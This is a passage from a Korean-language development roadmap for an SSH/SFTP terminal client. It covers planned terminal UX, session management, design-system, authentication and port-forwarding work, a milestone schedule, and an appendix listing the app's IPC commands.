   - `@xterm/addon-unicode11` — 한글/이모지 폭 계산
2. **설정 화면 신설** (현재 없음): 폰트 크기/패밀리(현재 13px 하드코딩, `TerminalView.tsx:46-57`), 테마 선택, scrollback 크기(현재 기본 1000), 커서 스타일, copy-on-select 토글
3. **탭 개선**:
   - 탭 이름 변경(더블클릭), 순서 변경(드래그), 우클릭 메뉴(복제/닫기/나머지 닫기)
   - 연결 상태 점 (초록=연결, 빨강=끊김, 노랑=연결 중)
   - 같은 호스트 다중 탭 시 자동 번호 (`user@host (2)`)
4. **글로벌 단축키** (현재 0개):
   - `Cmd+T` 새 연결, `Cmd+W` 탭 닫기, `Cmd+1..9` 탭 이동, `Ctrl+Tab` 다음 탭, `Cmd+F` 검색, `Cmd+K` 화면 지우기, `Cmd+±` 폰트 확대/축소
5. **상태바 신설** (하단): 활성 호스트 정보, 연결 시간, 커서 위치, SFTP 전송 상태 요약
6. **이벤트 리스너 구조 개선**: 탭 N개가 각각 전역 `terminal-output`을 구독하며 문자열 비교로 필터링 (`TerminalView.tsx:82`) → 단일 리스너 + 세션ID 라우팅 맵으로 교체

### 5.4 세션 관리 UI

1. **세션 편집 기능** (현재 클릭=즉시 연결이라 편집 불가): 편집 버튼/더블클릭으로 폼에 로드
2. **그룹/폴더 + 검색**: `sessionStore`를 `{ groups: [], sessions: [] }` 구조로 확장, 사이드바에 트리 + 필터 입력
3. **최근 연결 정렬 / 즐겨찾기**
4. **`~/.ssh/config` 가져오기** (§6.4)
5. **키 매니저 개선**: 파일 존재 검증(현재 연결 시점에야 실패 발견), passphrase 지원(§6.2와 연동), 지문 표시, readonly-input-as-button 패턴 제거 (`KeyManagerPanel.tsx:113-130`)

### 5.5 디자인 시스템 정리

1. **언어 통일**: 현재 영어 UI에 한국어 문자열 혼재 (`Sidebar.tsx:97,155,271,307,318`, `SessionForm.tsx:259,266,275`, `SftpExplorer.tsx:266-278`) → i18n 딕셔너리 도입(ko/en), 최소한 한 언어로 통일
2. **테마 토큰화**: zinc 팔레트 하드코딩 → CSS 변수 기반 토큰 (`--bg-primary`, `--border` 등). 라이트 테마는 P3.
3. **플랫폼별 타이틀바**: macOS 신호등이 Windows에서도 렌더됨 (`TitleBar.tsx`) — `get_platform` 활용해 Windows는 우측 컨트롤. 창 제목에 활성 세션 반영.
4. **컴포넌트 정리**:
   - 중첩 인터랙티브 요소 제거 — `div[role=button]` 안의 실제 `<button>` (`SessionList.tsx:19-57`, `MainArea.tsx:150-186`)
   - 탭리스트 roving tabindex + 화살표 키 (`MainArea.tsx:156`, `Sidebar.tsx:187-210`)
   - `pointer-events-none` disabled 패턴 → 실제 `disabled`/`aria-disabled`
   - 전 store 구독 → selector 구독 (`MainArea.tsx:32`, `SessionList.tsx:68` 등, 리렌더 폭주 방지)
5. **에러 바운더리** 추가 (현재 없음)

---

## 6. P3 — 기능 확장 (MobaXterm 대비)

우선순위 순:

### 6.1 SFTP 다운로드 + 파일 작업 (§5.2와 세트)
- `download_sftp_file(session_id, remote_path, local_path)` — 프로그레스 이벤트 포함
- `sftp_mkdir / sftp_rename / sftp_remove / sftp_chmod`
- 전송 프로그레스: `io::copy` 대신 32KB+ 청크 수동 루프 + `sftp-transfer-progress` 이벤트 + 취소 토큰

### 6.2 인증 방식 확장
- **keyboard-interactive**: 사내 바스천 OTP/2FA의 표준 — 현재 미지원이라 해당 서버 접속 불가. 프롬프트를 프론트로 중계하는 이벤트 왕복 구조 필요.
- **passphrase 걸린 키**: 현재 `direct.rs:132`에서 `None` 하드코딩 — 조용히 실패. passphrase 입력 다이얼로그.
- **SSH agent** (`userauth_agent`): ssh-agent/1Password 사용자 지원.

### 6.3 세션 유지/복원
- keepalive (§3.2)
- 끊김 시 자동 재연결 (지수 백오프, 사용자 옵션)
- 앱 재시작 시 열려 있던 탭 복원 옵션 (`terminalStore`에 persist 추가)

### 6.4 `~/.ssh/config` 가져오기
- `Host` 별칭, `IdentityFile`, `ProxyJump` 파싱 → 저장된 세션으로 임포트. 현재 사용자의 bastion 커맨드가 이미 ssh config 형태이므로 온보딩에 가장 효과적.

### 6.5 포트 포워딩 UI
- Local(-L) / Remote(-R) 포워딩 관리 화면. `channel_direct_tcpip` 인프라는 이미 바스천용으로 존재하므로 재활용 가능. Dynamic(-D, SOCKS)은 후순위.

### 6.6 다중 홉 (bastion 2단 이상)
- 현재 1홉 고정 (`bastion.rs:24-34`). 세션 설정을 `hops: []` 배열로.

### 6.7 장기 검토: russh 마이그레이션
- 현재 ssh2(libssh2)의 스레드 비안전성이 §3의 거의 모든 문제의 근원. 브리지 스레드/폴링 루프/이중 연결이 모두 불필요해짐. 다만 대공사이므로 P0~P2 안정화 후 별도 브랜치에서 검토.
- 부수 효과: 연결당 인증 1회로 감소(OTP 바스천 사용 가능), async 네이티브, keepalive/포워딩 API 개선.

---

## 7. 실행 로드맵

### Milestone 1 — "SFTP가 제대로 동작한다" (P0 버그)
- §1.1~1.6 SFTP root 버그 전체 (백엔드 경로 해석 + 프론트 race/state 분리)
- §3.1 SFTP 핸들 캐시 + Mutex (간헐 오류 제거)
- §2.5 하드코딩된 개인 정보 즉시 제거
- 검증: §1.7 완료 기준

### Milestone 2 — "터미널이 제대로 동작한다"
- §4.1 PTY resize (+ ResizeObserver)
- §4.2 한글 깨짐 (streaming decoder)
- §4.3 초기 출력 유실
- §5.1 Quick wins #1~5 (탭 활성화, 실패 토스트, 비밀번호 폼 유지 등)

### Milestone 3 — 보안
- §2.1 호스트 키 검증 (TOFU + 지문 다이얼로그)
- §2.2 ProxyCommand 인젝션 + 타임아웃
- §2.3 비밀번호 Debug/zeroize/키체인
- §2.4 CSP, §2.6 루프백 검증

### Milestone 4 — 안정성
- §3.2 keepalive + disconnect 이벤트 + 재연결 UI
- §3.3 셸 스레드 수명주기, §3.4 바스천 브리지, §3.5 뮤텍스
- §4.4 터미널 처리량, §4.5 세션 死 표시
- §3.6 기타 목록 소화

### Milestone 5 — SFTP 탐색기 재설계 + 다운로드
- §5.2 전체 (브레드크럼, 다운로드, 파일 작업, 전송 큐, 드롭 존 한정)
- §6.1 백엔드 커맨드 세트

### Milestone 6 — UX 폴리시
- §5.3 터미널 UX (애드온, 설정 화면, 단축키, 탭 개선, 상태바)
- §5.4 세션 관리 (편집, 그룹, 검색)
- §5.5 디자인 시스템 (i18n, 테마 토큰, 접근성)

### Milestone 7 — 기능 확장
- §6.2 인증 확장 → §6.3 세션 복원 → §6.4 ssh config 임포트 → §6.5 포워딩 → §6.6 다중 홉
- §6.7 russh 마이그레이션 타당성 검토

---

## 부록 A — 현재 IPC 표면 (참고)

**커맨드 9개** (`lib.rs:31-41`): `establish_ssh_connection`, `test_ssh_connection`, `get_os_username`, `get_platform`, `spawn_pty_process`, `write_to_terminal`, `close_ssh_session`, `read_sftp_directory`, `upload_sftp_files`

**이벤트 2개**: `terminal-output` (payload가 snake_case `session_id` — 다른 타입은 전부 camelCase라 통일 필요), `ssh-connection-progress` (session id 미포함 — 동시 연결 시 로그 구분 불가, 추가 필요)

**신설 예정**: `resize_pty`, `download_sftp_file`, `sftp_mkdir/rename/remove/chmod`, `reconnect_session` / 이벤트 `session-disconnected`, `sftp-transfer-progress`
